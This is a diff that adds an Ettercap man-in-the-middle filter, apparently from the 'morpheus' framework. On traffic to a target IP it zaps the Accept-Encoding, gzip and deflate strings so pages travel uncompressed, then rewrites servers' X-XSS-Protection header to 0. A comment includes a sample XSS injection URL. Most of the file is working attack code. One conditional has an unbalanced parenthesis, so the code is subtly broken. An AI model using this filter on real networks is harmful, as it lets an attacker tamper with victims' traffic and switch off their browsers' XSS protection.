@@ -1,0 +1,75 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+# Credits: https://peteris.rocks/blog/exotic-http-headers/                 #
+############################################################################
+
+
+##
+#  Cross-Site Scripting (XSS) is an attack In which malicious scripts
+#  can be injected on a page. the The X-XSS-Protection head value send
+#  In tcp/udp packet controls this behavior. this filter will change
+#  the X-XSS-Protection value In header to 0 (disable xss protection)
+#
+#  http://localhost:1234/?user=%3Cscript%3Ealert(%27hacked%27)%3C/script%3E&xss=0
+##
+
+
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+# change target request to server
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:IpAdDR   [ <- ]  port:80 http ☆");
+    if (search(DATA.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
+    }else{
+    if (search(DECODED.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | info : Encoding zapped from response ✔");
+    }
+    }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "gzip")) {
+    replace("gzip", "    "); # note: four spaces In the replacement string
+    msg("[Morpheus] | exec : replacing encoding content!");
+    msg("[Morpheus] | info : packet string gzip zapped ✔");
+  }
+}
+
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "deflate")) {
+    replace("deflate", "       "); # note: seven spaces In the replacement string
+    msg("[Morpheus] | exec : replacing encoding content!");
+    msg("[Morpheus] | info : packet string deflate zapped ✔");
+  }
+}
+
+
+
+
+#####################
+## Replace Content ##
+#####################
+# change server response to target
+if (ip.dst == 'IpAdDR' && ip.proto == TCP && tcp.src == 80) {
+  if search(DATA.data, "X-XSS-Protection: 1")){
+    replace("X-XSS-Protection: 1", "X-XSS-Protection: 0");
+    msg("[morpheus] | info : X-XSS-Protection found in header ☆");
+    msg("[Morpheus] | exec : replacing xss protection level ✔");
+    msg("[morpheus] |_info : packet forward back to target host ✔\n");
+  }
+}
+
